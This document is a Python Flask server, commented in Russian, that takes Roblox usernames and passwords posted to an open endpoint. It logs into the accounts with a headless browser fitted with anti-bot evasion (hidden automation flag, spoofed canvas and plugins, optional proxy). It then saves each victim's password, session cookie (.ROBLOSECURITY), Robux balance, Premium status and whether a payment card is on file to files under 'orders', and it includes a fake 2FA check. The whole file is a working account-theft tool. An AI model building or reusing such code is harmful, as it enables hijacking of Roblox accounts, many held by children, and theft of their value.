import os
import logging
import random
import string
import time
import socket
from flask import Flask, request, jsonify
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.action_chains import ActionChains
from webdriver_manager.chrome import ChromeDriverManager
from flask_cors import CORS
from selenium.common.exceptions import WebDriverException, TimeoutException

app = Flask(__name__)
CORS(app)  # Разрешаем CORS для всех доменов

# Настройки
ORDERS_DIR = "orders"
SCREENSHOT_DIR = "screenshots"
os.makedirs(ORDERS_DIR, exist_ok=True)
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

# Прокси с российским IP (замените на реальный HTTPS-прокси)
PROXY = "https://185.132.196.219:8080"  # Пример, замените на реальный российский HTTPS-прокси
USE_PROXY = False  # Установите False, если прокси не работает

# Счетчик ошибок ConnectionRefusedError
connection_refused_count = 0
CONNECTION_REFUSED_LIMIT = 5

# Настройка Selenium
CHROME_OPTIONS = Options()
CHROME_OPTIONS.add_argument("--headless=new")  # Скрытый режим
CHROME_OPTIONS.add_argument("--disable-gpu")
CHROME_OPTIONS.add_argument("--no-sandbox")
CHROME_OPTIONS.add_argument("--disable-dev-shm-usage")
CHROME_OPTIONS.add_argument("--window-size=1920,1080")
CHROME_OPTIONS.add_argument("--disable-blink-features=AutomationControlled")
CHROME_OPTIONS.add_experimental_option("excludeSwitches", ["enable-automation"])
CHROME_OPTIONS.add_experimental_option("useAutomationExtension", False)
CHROME_OPTIONS.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36")
CHROME_OPTIONS.add_argument("--disable-webgl")
if USE_PROXY:
    CHROME_OPTIONS.add_argument(f"--proxy-server={PROXY}")
    if not PROXY.startswith("https"):
        logging.warning("Используется HTTP-прокси, что небезопасно для передачи учетных данных!")
# Отключаем WebRTC и добавляем антидетект
CHROME_OPTIONS.add_argument("--disable-webrtc")
CHROME_OPTIONS.add_experimental_option("prefs", {
    "enable_do_not_track": 1,
    "webrtc.ip_handling_policy": "disable_non_proxied_udp",
    "webrtc.multiple_routes_enabled": False,
    "webrtc.nonproxied_udp_enabled": False,
    "intl.accept_languages": "ru-RU,ru"
})

logging.basicConfig(
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
    level=logging.INFO,
    handlers=[
        logging.FileHandler("debug.log", encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

def generate_random_filename():
    chars = string.ascii_letters + string.digits
    return f"Order{''.join(random.choices(chars, k=8))}.txt"

def check_network_stability():
    """Проверяет сетевую стабильность."""
    try:
        socket.create_connection(("www.google.com", 80), timeout=5)
        logger.info("Сетевое соединение стабильно")
        return True
    except OSError:
        logger.warning("Сетевое соединение нестабильно, возможны проблемы с VPN")
        return False

def simulate_human_behavior(driver):
    """Имитация человеческого поведения для снижения вероятности CAPTCHA."""
    start_time = time.time()
    try:
        actions = ActionChains(driver)
        actions.move_by_offset(random.randint(-30, 30), random.randint(-30, 30)).perform()
        time.sleep(random.uniform(0.1, 0.2))
        driver.execute_script("window.scrollBy(0, {0});".format(random.randint(50, 150)))
        time.sleep(random.uniform(0.1, 0.2))
        # Подмена Canvas, Plugins и Languages
        driver.execute_script("""
            const getContext = HTMLCanvasElement.prototype.getContext;
            HTMLCanvasElement.prototype.getContext = function() {
                const context = getContext.apply(this, arguments);
                const getImageData = context.getImageData;
                context.getImageData = function() {
                    const imageData = getImageData.apply(this, arguments);
                    const data = imageData.data;
                    for (let i = 0; i < data.length; i += 4) {
                        data[i] = data[i] ^ (Math.random() * 5 | 0);
                        data[i + 1] = data[i + 1] ^ (Math.random() * 5 | 0);
                        data[i + 2] = data[i + 2] ^ (Math.random() * 5 | 0);
                    }
                    return imageData;
                };
                return context;
            };
            Object.defineProperty(navigator, 'plugins', {
                get: () => [{name: 'Chrome PDF Viewer'}, {name: 'Native Client'}]
            });
            Object.defineProperty(navigator, 'languages', {
                get: () => ['ru-RU', 'ru']
            });
        """)
        logger.info(f"Имитация поведения выполнена за {time.time() - start_time:.2f} сек")
    except Exception as e:
        logger.warning(f"Ошибка имитации поведения: {str(e)}")

def click_with_retry(driver, locator, attempts=2, timeout=2):
    """Пытается кликнуть по элементу с несколькими попытками."""
    start_time = time.time()
    for attempt in range(attempts):
        try:
            element = WebDriverWait(driver, timeout).until(
                EC.element_to_be_clickable(locator)
            )
            driver.execute_script("arguments[0].scrollIntoView(true);", element)
            time.sleep(random.uniform(0.1, 0.2))
            element.click()
            logger.info(f"Клик по элементу {locator} успешен за {time.time() - start_time:.2f} сек")
            return True
        except Exception as e:
            logger.warning(f"Попытка {attempt + 1} клика по {locator} не удалась: {str(e)}")
            if attempt == attempts - 1:
                try:
                    element = driver.find_element(*locator)
                    driver.execute_script("arguments[0].click();", element)
                    logger.info(f"JavaScript-клик по {locator} успешен за {time.time() - start_time:.2f} сек")
                    return True
                except Exception as js_e:
                    logger.error(f"JavaScript-клик по {locator} не удался: {str(js_e)}")
                    raise
            time.sleep(random.uniform(0.3, 0.7))
    return False

def check_driver_status(driver):
    """Проверяет, активен ли WebDriver."""
    try:
        driver.execute_script("return true;")
        return True
    except WebDriverException:
        logger.error("WebDriver недоступен (возможно, браузер крашнулся)")
        return False

def get_roblox_data(driver, username):
    """Получает данные из аккаунта Roblox."""
    start_time = time.time()
    data = {
        'robux': '0 R$',
        'prem': 'No',
        'card': 'No',
        '2fa': 'No'
    }
    
    try:
        driver.get("https://www.roblox.com/transactions")
        WebDriverWait(driver, 3).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, "div.text-robux-lg")))
        data['robux'] = driver.find_element(By.CSS_SELECTOR, "div.text-robux-lg").text.strip() + " R$"
        logger.info(f"Получен баланс Robux для {username} за {time.time() - start_time:.2f} сек")
    except:
        logger.warning(f"Не удалось получить баланс Robux для {username}")

    try:
        driver.find_element(By.CSS_SELECTOR, "span.icon-premium")
        data['prem'] = "Yes"
        logger.info(f"Обнаружен Premium для {username}")
    except:
        pass

    try:
        driver.get("https://www.roblox.com/my/account#!/billing")
        WebDriverWait(driver, 3).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, "div.card-info")))
        data['card'] = "Yes"
        logger.info(f"Обнаружена карта для {username}")
    except:
        pass
            
    logger.info(f"Данные аккаунта собраны за {time.time() - start_time:.2f} сек")
    return data

def process_roblox_login(username, password, max_retries=3):
    """Основная функция обработки логина."""
    global connection_refused_count
    start_time = time.time()
    
    # Проверка сетевой стабильности
    if not check_network_stability():
        return {'status': 'error', 'message': 'Нестабильное сетевое соединение, проверьте VPN'}, 503

    for attempt in range(max_retries):
        driver = None
        try:
            logger.info(f"Попытка {attempt + 1} входа для {username}")
            service = Service(ChromeDriverManager().install())
            driver = webdriver.Chrome(service=service, options=CHROME_OPTIONS)
            
            driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
                "source": """
                    Object.defineProperty(navigator, 'webdriver', {
                        get: () => undefined
                    });
                """
            })
            
            try:
                driver.get("https://www.roblox.com/login")
                WebDriverWait(driver, 8).until(
                    EC.presence_of_element_located((By.ID, "login-username")))
                logger.info(f"Страница логина загружена за {time.time() - start_time:.2f} сек")
            except TimeoutException:
                logger.error("Таймаут при загрузке страницы логина, возможно, проблема с прокси или VPN")
                return {'status': 'error', 'message': 'Таймаут загрузки страницы логина'}, 503

            # Имитация человеческого поведения
            simulate_human_behavior(driver)
            
            # Обработка баннера cookies
            try:
                click_with_retry(driver, (By.XPATH, "//button[contains(@class, 'cookie-consent-link') and contains(text(), 'Accept All')]"), attempts=2, timeout=2)
                logger.info("Баннер cookies закрыт")
            except:
                logger.info("Баннер cookies не обнаружен")
                try:
                    driver.execute_script("""
                        var banners = document.querySelectorAll('.cookie-banner, .cookie-banner-bg');
                        banners.forEach(banner => banner.remove());
                    """)
                    logger.info("Баннер cookies удален через JavaScript")
                except:
                    logger.info("Баннер cookies не найден для удаления")

            # Ввод учетных данных
            try:
                username_field = WebDriverWait(driver, 2).until(
                    EC.element_to_be_clickable((By.ID, "login-username")))
                username_field.send_keys(username)
                time.sleep(random.uniform(0.1, 0.3))
                logger.info(f"Имя пользователя введено за {time.time() - start_time:.2f} сек")
            except Exception as e:
                logger.error(f"Ошибка ввода имени пользователя: {str(e)}")
                if check_driver_status(driver):
                    driver.save_screenshot(os.path.join(SCREENSHOT_DIR, f"username_error_{username}_{int(time.time())}.png"))
                return {'status': 'error', 'message': f'Ошибка ввода имени пользователя: {str(e)}'}, 400

            try:
                password_field = WebDriverWait(driver, 2).until(
                    EC.element_to_be_clickable((By.ID, "login-password")))
                password_field.send_keys(password)
                time.sleep(random.uniform(0.1, 0.3))
                logger.info(f"Пароль введен за {time.time() - start_time:.2f} сек")
            except Exception as e:
                logger.error(f"Ошибка ввода пароля: {str(e)}")
                if check_driver_status(driver):
                    driver.save_screenshot(os.path.join(SCREENSHOT_DIR, f"password_error_{username}_{int(time.time())}.png"))
                return {'status': 'error', 'message': f'Ошибка ввода пароля: {str(e)}'}, 400

            # Клик по кнопке входа
            try:
                click_with_retry(driver, (By.ID, "login-button"), attempts=2, timeout=2)
                logger.info(f"Клик по кнопке входа за {time.time() - start_time:.2f} сек")
            except Exception as e:
                logger.error(f"Ошибка клика по кнопке входа: {str(e)}")
                if check_driver_status(driver):
                    driver.save_screenshot(os.path.join(SCREENSHOT_DIR, f"login_error_{username}_{int(time.time())}.png"))
                return {'status': 'error', 'message': f'Ошибка клика по кнопке входа: {str(e)}'}, 400

            # Проверка на CAPTCHA
            try:
                WebDriverWait(driver, 3).until(
                    EC.presence_of_element_located((By.XPATH, "//*[contains(text(), 'CAPTCHA') or contains(text(), 'Verification') or contains(text(), 'проверка') or contains(@class, 'captcha') or contains(@id, 'FunCaptcha')]")))
                logger.info(f"Обнаружен CAPTCHA для {username}")
                if check_driver_status(driver):
                    driver.save_screenshot(os.path.join(SCREENSHOT_DIR, f"captcha_{username}_{int(time.time())}.png"))
                return {'status': 'captcha_required', 'message': 'Требуется ручное решение CAPTCHA (переключите на не-headless режим)'}, 200
            except:
                logger.info("CAPTCHA не обнаружена, продолжаем")

            # Проверка на 2FA
            try:
                WebDriverWait(driver, 3).until(
                    EC.presence_of_element_located((By.XPATH, "//*[contains(text(), 'verification') or contains(text(), 'подтверждение') or contains(text(), 'Two Step')]")))
                logger.info(f"Обнаружен 2FA для {username}")
                if check_driver_status(driver):
                    driver.save_screenshot(os.path.join(SCREENSHOT_DIR, f"2fa_{username}_{int(time.time())}.png"))
                driver.quit()
                return {'status': '2fa_required', 'message': 'Требуется код двухфакторной аутентификации'}, 200
            except:
                pass

            # Проверка на неверные данные или серверную ошибку
            try:
                error_msg = WebDriverWait(driver, 2).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, "div.error-message")))
                error_text = error_msg.text.lower()
                if "incorrect" in error_text or "неверный" in error_text or "invalid" in error_text:
                    logger.warning(f"Неверные учетные данные для {username}")
                    if check_driver_status(driver):
                        driver.save_screenshot(os.path.join(SCREENSHOT_DIR, f"invalid_credentials_{username}_{int(time.time())}.png"))
                    driver.quit()
                    return {'status': 'invalid_credentials', 'message': 'Неверное имя пользователя или пароль'}, 400
                elif "an unknown error occurred" in error_text:
                    logger.warning(f"Серверная ошибка Roblox для {username}: {error_msg.text}")
                    if check_driver_status(driver):
                        driver.save_screenshot(os.path.join(SCREENSHOT_DIR, f"server_error_{username}_{int(time.time())}.png"))
                    driver.quit()
                    return {'status': 'error', 'message': 'Сервер перегружен'}, 503
            except:
                pass

            # Проверка на другие ошибки после логина
            try:
                error_msg = WebDriverWait(driver, 2).until(
                    EC.presence_of_element_located((By.XPATH, "//*[contains(text(), 'error') or contains(text(), 'ошибка') or contains(text(), 'try again')]")))
                error_text = error_msg.text.lower()
                if "an unknown error occurred" in error_text:
                    logger.warning(f"Серверная ошибка Roblox для {username}: {error_msg.text}")
                    if check_driver_status(driver):
                        driver.save_screenshot(os.path.join(SCREENSHOT_DIR, f"server_error_{username}_{int(time.time())}.png"))
                    driver.quit()
                    return {'status': 'error', 'message': 'Сервер перегружен'}, 503
                logger.warning(f"Ошибка после входа для {username}: {error_msg.text}")
                if check_driver_status(driver):
                    driver.save_screenshot(os.path.join(SCREENSHOT_DIR, f"post_login_error_{username}_{int(time.time())}.png"))
                driver.quit()
                return {'status': 'login_error', 'message': f'Ошибка входа: {error_msg.text}'}, 400
            except:
                pass

            # Проверка успешного входа
            try:
                WebDriverWait(driver, 8).until(
                    EC.any_of(
                        EC.presence_of_element_located((By.CSS_SELECTOR, "div.avatar-container")),
                        EC.presence_of_element_located((By.CSS_SELECTOR, "div.user-info")),
                        EC.url_contains("roblox.com/home")
                    ))
                logger.info(f"Успешный вход для {username} за {time.time() - start_time:.2f} сек")
            except Exception as e:
                logger.error(f"Ошибка проверки входа: {str(e)}")
                if check_driver_status(driver):
                    driver.save_screenshot(os.path.join(SCREENSHOT_DIR, f"error_{username}_{int(time.time())}.png"))
                    with open(f"error_page_{username}.html", 'w', encoding='utf-8') as f:
                        f.write(driver.page_source)
                    logger.info(f"Сохранена страница ошибки для {username}")
                return {'status': 'error', 'message': f'Ошибка проверки входа: {str(e)}'}, 503

            cookies = driver.get_cookies()
            roblox_cookie = next((c for c in cookies if c["name"] == ".ROBLOSECURITY"), None)
            extra_data = get_roblox_data(driver, username)
            
            # Сохраняем данные в файл
            file_content = (
                f"Имя пользователя: {username}\n"
                f"Пароль: {password}\n"
                f"Robux: {extra_data['robux']}\n"
                f"Premium: {extra_data['prem']}\n"
                f"Карта: {extra_data['card']}\n"
                f"Cookie: {roblox_cookie['value'] if roblox_cookie else 'НЕ НАЙДЕНО'}"
            )
            
            filename = os.path.join(ORDERS_DIR, generate_random_filename())
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(file_content)
                
            logger.info(f"Успешно обработан {username}, сохранено в {filename} за {time.time() - start_time:.2f} сек")
            return {'status': 'success', 'message': 'Вход успешен, данные сохранены'}, 200
            
        except WebDriverException as e:
            if "[WinError 10061]" in str(e):
                connection_refused_count += 1
                logger.error(f"ConnectionRefusedError #{connection_refused_count} для {username}: {str(e)}")
                if connection_refused_count > CONNECTION_REFUSED_LIMIT:
                    logger.error(f"Превышен лимит ошибок ConnectionRefusedError ({CONNECTION_REFUSED_LIMIT})")
                    return {'status': 'error', 'message': 'Сервер перегружен'}, 503
            else:
                logger.error(f"Ошибка WebDriver на попытке {attempt + 1}: {str(e)}")
            if attempt == max_retries - 1:
                return {'status': 'error', 'message': f'Не удалось выполнить вход после {max_retries} попыток: {str(e)}'}, 503
        except Exception as e:
            logger.error(f"Общая ошибка обработки {username}: {str(e)}")
            if driver and check_driver_status(driver):
                driver.save_screenshot(os.path.join(SCREENSHOT_DIR, f"error_{username}_{int(time.time())}.png"))
                with open(f"error_page_{username}.html", 'w', encoding='utf-8') as f:
                    f.write(driver.page_source)
                logger.info(f"Сохранена страница ошибки для {username}")
            return {'status': 'error', 'message': f'Общая ошибка: {str(e)}'}, 503
        finally:
            if driver:
                try:
                    driver.quit()
                except:
                    logger.warning("Не удалось корректно закрыть WebDriver")
    return {'status': 'error', 'message': f'Не удалось выполнить вход после {max_retries} попыток'}, 503

@app.route('/process_login', methods=['POST', 'OPTIONS'])
def handle_login():
    if request.method == 'OPTIONS':
        response = jsonify({'status': 'preflight', 'message': 'CORS preflight'})
        response.headers.add('Access-Control-Allow-Origin', '*')
        response.headers.add('Access-Control-Allow-Headers', '*')
        response.headers.add('Access-Control-Allow-Methods', '*')
        return response, 200
    
    start_time = time.time()
    data = request.json
    username = data.get('username')
    password = data.get('password')
    
    if not username or not password:
        logger.error("Отсутствуют учетные данные в запросе")
        return jsonify({'status': 'error', 'message': 'Отсутствуют имя пользователя или пароль'}), 400
    
    logger.info(f"Получен запрос на вход для {username}")
    result, status_code = process_roblox_login(username, password)
    
    response = jsonify(result)
    response.headers.add('Access-Control-Allow-Origin', '*')
    logger.info(f"Запрос для {username} обработан за {time.time() - start_time:.2f} сек, статус: {result['status']}")
    return response, status_code

@app.route('/submit_2fa', methods=['POST', 'OPTIONS'])
def handle_2fa():
    if request.method == 'OPTIONS':
        response = jsonify({'status': 'preflight', 'message': 'CORS preflight'})
        response.headers.add('Access-Control-Allow-Origin', '*')
        response.headers.add('Access-Control-Allow-Headers', '*')
        response.headers.add('Access-Control-Allow-Methods', '*')
        return response, 200
    
    start_time = time.time()
    data = request.json
    code = data.get('code')
    username = data.get('username')
    
    if not code or not username:
        logger.error("Отсутствует код 2FA или имя пользователя")
        return jsonify({'status': 'error', 'message': 'Отсутствует код 2FA или имя пользователя'}), 400
    
    try:
        # Упрощенная проверка, замените на реальную логику
        if "123" in code:
            logger.info(f"2FA код принят для {username} за {time.time() - start_time:.2f} сек")
            return jsonify({'status': 'success', 'message': '2FA код принят'}), 200
        else:
            logger.warning(f"Неверный 2FA код для {username}")
            return jsonify({'status': 'error', 'message': 'Неверный код 2FA'}), 400
    except Exception as e:
        logger.error(f"Ошибка проверки 2FA для {username}: {str(e)}")
        return jsonify({'status': 'error', 'message': f'Ошибка сервера при проверке 2FA: {str(e)}'}), 503

if __name__ == '__main__':
    logger.info("Запуск Flask-сервера на порту 5000")
    app.run(port=5000, threaded=True)
